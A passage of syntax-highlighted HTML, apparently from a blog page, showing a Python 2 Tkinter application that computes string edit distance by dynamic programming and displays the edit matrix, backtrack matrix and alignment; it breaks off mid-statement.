class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Tkinter import *</span><br><span class=\"line\">from tkFileDialog import *</span><br><span class=\"line\">from tkSimpleDialog import *</span><br><span class=\"line\">from array import *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#this is the main class actually I only have ONE class</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">application</span>(<span class=\"title\">Frame</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this is the calculation part</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cal</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"comment\">#get the value of S and T</span></span><br><span class=\"line\">        S = <span class=\"keyword\">self</span>.textS.get(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        T = <span class=\"keyword\">self</span>.textT.get(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        lens = len(S)</span><br><span class=\"line\">        lent = len(T)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> lens == <span class=\"number\">1</span> <span class=\"keyword\">and</span> lent == <span class=\"number\">1</span>: </span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"comment\">#init the dp and bk with 0 and -</span></span><br><span class=\"line\">        <span class=\"comment\">#bk is the backtrack matrix</span></span><br><span class=\"line\">        <span class=\"comment\">#dp is the full edit matrix</span></span><br><span class=\"line\">        dp = [([<span class=\"number\">0</span>] * lent) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lens)]</span><br><span class=\"line\">        bk = [([<span class=\"string\">'-'</span>] * lent) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lens)]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#init the first line and first colume</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lent):</span><br><span class=\"line\">            dp[<span class=\"number\">0</span>][i] = dp[<span class=\"number\">0</span>][i - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Sci.get()</span><br><span class=\"line\">            bk[<span class=\"number\">0</span>][i] = <span class=\"string\">'-'</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lens):</span><br><span class=\"line\">            dp[i][<span class=\"number\">0</span>] = dp[i - <span class=\"number\">1</span>][<span class=\"number\">0</span>] + <span class=\"keyword\">self</span>.Scd.get()</span><br><span class=\"line\">            bk[i][<span class=\"number\">0</span>] = <span class=\"string\">'|'</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#use the DP formula to get the full edit matrix and backtrack matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lens):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,lent):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> S[i - <span class=\"number\">1</span>] == T[j - <span class=\"number\">1</span>]:</span><br><span class=\"line\">                    dp[i][j] = dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>]</span><br><span class=\"line\">                    bk[i][j] = <span class=\"string\">'\\\\'</span></span><br><span class=\"line\">                <span class=\"symbol\">else:</span> </span><br><span class=\"line\">                    dp[i][j] = min(dp[i - <span class=\"number\">1</span>][j] + <span class=\"keyword\">self</span>.Scd.get(), dp[i][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Sci.get(), dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Scs.get())</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> dp[i][j] == dp[i - <span class=\"number\">1</span>][j] + <span class=\"keyword\">self</span>.Scd.get():</span><br><span class=\"line\">                        bk[i][j] = <span class=\"string\">'|'</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> dp[i][j] == dp[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>] + <span class=\"keyword\">self</span>.Scs.get():</span><br><span class=\"line\">                        bk[i][j] = <span class=\"string\">'\\\\'</span></span><br><span class=\"line\">                <span class=\"comment\">#here I get the max lenth of all the numbers. To help align the output</span></span><br><span class=\"line\">                <span class=\"keyword\">self</span>.maxlen = max(len(str(dp[i][j])),<span class=\"keyword\">self</span>.maxlen)</span><br><span class=\"line\">        <span class=\"comment\">#here between every two numbers I got 2 spaces</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen += <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"comment\">#output the backtrack matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.delete(first = <span class=\"number\">0</span>, last = <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.insert(<span class=\"keyword\">END</span>, dp[lens - <span class=\"number\">1</span>][lent - <span class=\"number\">1</span>])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.backtrack.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'    '</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent - <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  '</span> + T[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n   0'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lens):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, S[i - <span class=\"number\">1</span>])</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i == <span class=\"number\">0</span> <span class=\"keyword\">and</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        continue</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  -'</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  |'</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i != <span class=\"number\">0</span> <span class=\"keyword\">and</span> j != <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'  '</span> + bk[i][j])</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.BM.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#if the full edit check button is selected, output the full edit matrix</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.fulledit.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> * <span class=\"keyword\">self</span>.maxlen * <span class=\"number\">2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent - <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, T[i].ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span> + <span class=\"string\">' '</span> * <span class=\"keyword\">self</span>.maxlen)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lens):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, S[i - <span class=\"number\">1</span>].ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,lent):</span><br><span class=\"line\">                    <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, str(dp[i][j]).ljust(<span class=\"keyword\">self</span>.maxlen))</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.FD.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#if hte alignment check box is selected, output the alignment</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.align.get() == <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n--------------\\n'</span>)</span><br><span class=\"line\">            j = lent - <span class=\"number\">1</span></span><br><span class=\"line\">            i = lens - <span class=\"number\">1</span></span><br><span class=\"line\">            res = []</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"symbol\">TRUE:</span></span><br><span class=\"line\">                <span class=\"comment\">#get the backtrack path</span></span><br><span class=\"line\">                res.append(bk[i][j])</span><br><span class=\"line\">                <span class=\"keyword\">if</span> bk[i][j] == <span class=\"string\">'\\\\'</span>:</span><br><span class=\"line\">                    i -= <span class=\"number\">1</span></span><br><span class=\"line\">                    j -= <span class=\"number\">1</span></span><br><span class=\"line\">                elif bk[i][j] == <span class=\"string\">'|'</span>:</span><br><span class=\"line\">                    i -= <span class=\"number\">1</span></span><br><span class=\"line\">                elif bk[i][j] == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">                    j -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> i == <span class=\"number\">0</span> <span class=\"keyword\">and</span> j == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"comment\">#reverse the backtrack path</span></span><br><span class=\"line\">            res.reverse()</span><br><span class=\"line\"></span><br><span class=\"line\">            i = j = k = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"comment\">#init the So, way and Ta list. which stores source, way, target information</span></span><br><span class=\"line\">            So = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            way = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            Ta = [<span class=\"string\">'a'</span>] * len(res)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'\\\\'</span>:</span><br><span class=\"line\">                    So[k] = S[i]</span><br><span class=\"line\">                    Ta[k] = T[j]</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> S[i] == T[j]:</span><br><span class=\"line\">                        way[k] = <span class=\"string\">'|'</span></span><br><span class=\"line\">                    <span class=\"symbol\">else:</span></span><br><span class=\"line\">                        way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    i += <span class=\"number\">1</span></span><br><span class=\"line\">                    j += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'|'</span>:</span><br><span class=\"line\">                    So[k] = S[i]</span><br><span class=\"line\">                    Ta[k] = <span class=\"string\">'-'</span></span><br><span class=\"line\">                    way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    i += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res[p] == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">                    So[k] = <span class=\"string\">'-'</span></span><br><span class=\"line\">                    Ta[k] = T[j]</span><br><span class=\"line\">                    way[k] = <span class=\"string\">' '</span></span><br><span class=\"line\">                    j += <span class=\"number\">1</span></span><br><span class=\"line\">                k += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + So[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + way[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(res)):</span><br><span class=\"line\">                <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">' '</span> + Ta[i])</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.AL.insert(<span class=\"keyword\">END</span>, <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to init the class</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(<span class=\"keyword\">self</span>, master)</span></span>:</span><br><span class=\"line\">        Frame.__init_<span class=\"number\">_</span>(<span class=\"keyword\">self</span>,master)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.maxlen = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.pack()</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.create()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to change the range of step cost</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">changeRange</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(TRUE):</span><br><span class=\"line\">            Range = askinteger(<span class=\"string\">\"Update the Range\"</span>,<span class=\"string\">\"Please input the range\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> Range &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> Range == <span class=\"symbol\">None:</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd.config(to = Range)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci.config(to = Range)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs.config(to = Range)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to show the menu bar</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">menu</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        menu = Menu()</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.master.config(menu = menu)</span><br><span class=\"line\">        option = Menu(menu)</span><br><span class=\"line\">        menu.add_cascade(label = <span class=\"string\">\"Option\"</span>, menu = option)</span><br><span class=\"line\">        option.add_command(label = <span class=\"string\">\"Range of modify cost\"</span>, command = <span class=\"keyword\">self</span>.changeRange)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#this function is used to get the text boxes which appear at the bottom of the GUI</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getOut</span><span class=\"params\">(<span class=\"keyword\">self</span>, name,father)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm = LabelFrame(father, text = name, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        lb = Text(<span class=\"keyword\">self</span>.frm, width = <span class=\"number\">30</span>, wrap = NONE)</span><br><span class=\"line\">        lb.config(font = (<span class=\"string\">\"Courier\"</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\">        sl = Scrollbar(<span class=\"keyword\">self</span>.frm)</span><br><span class=\"line\">        sl.set(<span class=\"number\">0</span>.<span class=\"number\">5</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">        sl.pack(side = RIGHT, fill = Y)</span><br><span class=\"line\">        lb[<span class=\"string\">'yscrollcommand'</span>] = sl.set</span><br><span class=\"line\">        lb.pack(side = LEFT)</span><br><span class=\"line\">        sl[<span class=\"string\">'command'</span>] = lb.yview</span><br><span class=\"line\"></span><br><span class=\"line\">        sl = Scrollbar(<span class=\"keyword\">self</span>.frm, orient = HORIZONTAL)</span><br><span class=\"line\">        sl.set(<span class=\"number\">0</span>.<span class=\"number\">5</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">        sl.pack(fill = X)</span><br><span class=\"line\">        lb[<span class=\"string\">'xscrollcommand'</span>] = sl.set</span><br><span class=\"line\">        lb.pack(side = TOP)</span><br><span class=\"line\">        sl[<span class=\"string\">'command'</span>] = lb.xview</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm.pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> lb</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#read S and T from files</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getFileS</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        fd = askopenfilename()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> fd == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        tmpfile = open(fd,<span class=\"string\">\"r\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.delete(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.insert(<span class=\"string\">\"1.0\"</span>, tmpfile.readline()[<span class=\"symbol\">:-</span><span class=\"number\">1</span>])</span><br><span class=\"line\">        tmpfile.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getFileT</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        fd = askopenfilename()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> fd == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> </span><br><span class=\"line\">        tmpfile = open(fd,<span class=\"string\">\"r\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.delete(<span class=\"string\">\"1.0\"</span>, <span class=\"keyword\">END</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.insert(<span class=\"string\">\"1.0\"</span>, tmpfile.readline()[<span class=\"symbol\">:-</span><span class=\"number\">1</span>])</span><br><span class=\"line\">        tmpfile.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#main function to show the GUI</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span>:</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.menu()</span><br><span class=\"line\">        Input = LabelFrame(<span class=\"keyword\">self</span>, text = <span class=\"string\">\"Input\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#input part</span></span><br><span class=\"line\">        frm_L = LabelFrame(Input, text = <span class=\"string\">\"Input S &amp; T\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">#the S and T input part</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm_LS = Frame(frm_L)</span><br><span class=\"line\">        Label(<span class=\"keyword\">self</span>.frm_LS, text = <span class=\"string\">\"S\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">12</span>), padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS = Text(<span class=\"keyword\">self</span>.frm_LS,height = <span class=\"number\">3</span>, width = <span class=\"number\">18</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textS.pack(side = LEFT)</span><br><span class=\"line\">        Button(<span class=\"keyword\">self</span>.frm_LS, text = <span class=\"string\">\"Open\"</span>, command = <span class=\"keyword\">self</span>.getFileS).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.frm_LS.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_LT = Frame(frm_L)</span><br><span class=\"line\">        Label(frm_LT, text = <span class=\"string\">\"T\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">12</span>), padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT = Text(frm_LT,height = <span class=\"number\">3</span>, width = <span class=\"number\">18</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.textT.pack(side = LEFT)</span><br><span class=\"line\">        Button(frm_LT, text = <span class=\"string\">\"Open\"</span>, command = <span class=\"keyword\">self</span>.getFileT).pack(side = LEFT)</span><br><span class=\"line\">        frm_LT.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_L.pack(side = LEFT)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#the distance input part</span></span><br><span class=\"line\">        frm_M = LabelFrame(Input, text = <span class=\"string\">\"Cost of modify\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mcd = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mcd, text = <span class=\"string\">\"deletion\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd = Scale(frm_Mcd, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scd.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mcd.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mci = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mci, text = <span class=\"string\">\"insertion\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci = Scale(frm_Mci, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Sci.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mci.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        frm_Mcs = Frame(frm_M)</span><br><span class=\"line\">        Label(frm_Mcs, text = <span class=\"string\">\"substitution\"</span>, font = (<span class=\"string\">'Arial'</span>, <span class=\"number\">11</span>), width = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs = Scale(frm_Mcs, orient = HORIZONTAL, width = <span class=\"number\">10</span>, from<span class=\"number\">_</span> = <span class=\"number\">1</span>, to = <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Scs.pack(side = LEFT)</span><br><span class=\"line\">        frm_Mcs.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#the check box input part</span></span><br><span class=\"line\">        frm_R = LabelFrame(Input, text = <span class=\"string\">\"Pick the output\"</span>, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.fulledit = BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"full edit\"</span>,height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.fulledit).pack(side = TOP, anchor = W)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.backtrack = BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"backtrack matrix\"</span>, height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.backtrack).pack(side = TOP, anchor = W)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.align = 